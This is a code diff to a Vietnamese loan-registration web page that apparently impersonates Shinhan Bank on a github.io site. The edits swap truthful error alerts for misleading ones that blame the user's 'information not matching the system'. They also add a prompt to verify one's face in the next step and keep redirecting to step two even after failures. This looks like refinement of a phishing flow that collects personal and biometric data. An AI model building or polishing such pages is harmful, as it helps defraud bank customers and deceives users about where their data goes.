@@ -348,7 +348,7 @@
                                         <label for="email" class="form-label">E-mail *</label>
                                         <input type="email" class="form-control" id="email" name="email" autocomplete="email" required>
                                         <p id="emailError" class="error"></p>
-                                        <small class="form-text text-muted">Bạn sẽ nhận thông tin hướng dẫn qua email này.</small>
+                                        <small class="form-text text-muted">Bạn sẽ nhận thông tin hồ sơ đăng ký về email này .</small>
                                     </div>
                                 </div>
                                 <div class="row">
@@ -684,7 +684,7 @@
                 return true;
             } catch (e) {
                 console.error('LocalStorage quota exceeded:', e);
-                alert('Dung lượng lưu trữ trình duyệt đã đầy. Vui lòng xóa dữ liệu trình duyệt.');
+                alert('Thông tin đăng ký không chính xác. Vui lòng thử lại sau.');
                 return false;
             }
         }
@@ -698,7 +698,7 @@
                 return true;
             } catch (error) {
                 console.error('Error saving userData to localStorage:', error);
-                alert('Lỗi lưu dữ liệu. Vui lòng thử lại.');
+                alert('Thông tin của quý khách không trùng khớp tại hệ thống. Vui lòng thử lại hoặc liên hệ hỗ trợ.');
                 return false;
             }
         }
@@ -977,7 +977,7 @@
                         userData.emailSent = true;
                         saveToLocalStorage();
                         spinner.style.display = 'none';
-                        alert('Đăng ký hoàn tất! Kiểm tra email để nhận mã xác nhận.');
+                        alert('Vui lòng xác minh khuôn mặt ở bước tiếp theo.');
                         setTimeout(() => {
                             window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step2.html';
                         }, 500);
@@ -990,7 +990,7 @@
                         } else {
                             console.error('Email failed after retries:', error);
                             spinner.style.display = 'none';
-                            alert('Lỗi gửi email, nhưng đăng ký đã được lưu. Vui lòng kiểm tra sau.');
+                            alert('Đăng ký không thành công. Thông tin không trùng khớp tại hệ thống hoặc không đúng, vui lòng thử lại hoặc  liên hệ hỗ trợ . ');
                             setTimeout(() => {
                                 window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step2.html';
                             }, 500);
@@ -1000,7 +1000,7 @@
                 sendEmail();
             } else {
                 spinner.style.display = 'none';
-                alert('Lỗi lưu dữ liệu.');
+                alert('Lỗi vui lòng kiểm tra lại thông tin hoặc mục còn thiếu .');
                 console.error('LocalStorage save failed');
             }
         }
